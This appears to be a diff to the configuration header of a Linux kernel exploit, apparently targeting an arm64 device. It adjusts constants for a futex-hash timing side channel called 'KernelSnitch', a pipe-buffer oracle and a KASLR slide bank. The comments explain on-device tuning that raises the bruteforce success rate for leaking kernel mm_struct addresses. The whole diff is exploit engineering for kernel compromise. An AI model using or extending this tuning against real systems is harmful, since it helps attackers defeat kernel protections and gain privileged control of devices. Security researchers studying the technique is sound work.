@@ -19,7 +19,21 @@
 #define P0_KERNEL_PHYS_LOAD 0x80080000ULL
 #define SKB_DATA_DELTA (-0x1000LL)
 #define MM_STRUCT_SZ 0x3c0
-#define MM_ORDER 3
+/*
+ * MM_ORDER stays 3: ORDER3_SIZE = (4096 << MM_ORDER) is the size of the
+ * reclaimed kernel page for the p0 pipe-buffer oracle and the slide bank,
+ * which is a 32K (order-3) allocation.
+ *
+ * MM_SLAB_ORDER is the mm_struct slab cache order, used by KernelSnitch for
+ * the bruteforce slab step and the per-slab object count.  Device-derived
+ * (2026-08-10): with a 32K step the candidate grid only covers mm objects
+ * whose slab page is 32K-aligned; the on-device max_matches=4/4 rate of ~8%
+ * (unchanged when the futex hash size was moved 0x800->0x400, proving the sim
+ * hash was never the issue) matches a 4K (order-0) mm slab, where only 1/8 of
+ * pages are 32K-aligned.  An order-0 grid (4K-aligned + k*0x3c0) covers mm
+ * objects of EVERY slab order, because every slab base is 4K-aligned.
+ */
+#define MM_SLAB_ORDER 0
 /*
  * MTE is left DISABLED for KernelSnitch: disassembly of get_futex_key shows
  * key->private.mm = current->mm is stored untagged, so the untagged bruteforce
@@ -29,16 +43,11 @@
 #define KERNELSNITCH_MTE_ENABLED 0
 #define KERNELSNITCH_VERBOSE 1
 /*
- * Device-derived (2026-08-10 diagnostic run): with the sim at 0x800 the
- * bruteforce reached max_matches=4/4 in only 2/24 attempts (8%), exactly the
- * (1/2)^4 pattern of a one-bit-too-fine sim mask.  Real kernel collisions are
- * found with ~200x margins, so the side channel works; a sim mask that is
- * finer than the kernel's bucket mask only aligns each collision pair with
- * p=1/2, and all four only 1/16 of the time.  The only consistent kernel
- * hash table size is therefore 0x400 (finer than 0x800).  0x400 also works if
- * the kernel is actually coarser (subset mask => guaranteed match), so it is
- * the safe value.  (Static disassembly of futex_init suggested 0x800 from 8
- * DT cpu nodes, but the device behavior is the ground truth.)
+ * Kept at 0x400 as a safe subset: the earlier ~8% max_matches=4/4 rate was
+ * traced to the MM_ORDER grid coverage (see above), NOT the futex hash size
+ * (changing 0x800->0x400 left the rate unchanged).  A coarse sim mask is a
+ * strict subset of any larger kernel bucket mask, so 0x400 matches the kernel
+ * for any real hash table >= 0x400, with negligible false-positive cost.
  */
 #define KERNELSNITCH_FUTEX_HASH_SIZE 0x400
 #define KSNITCH_COLLISIONS 5
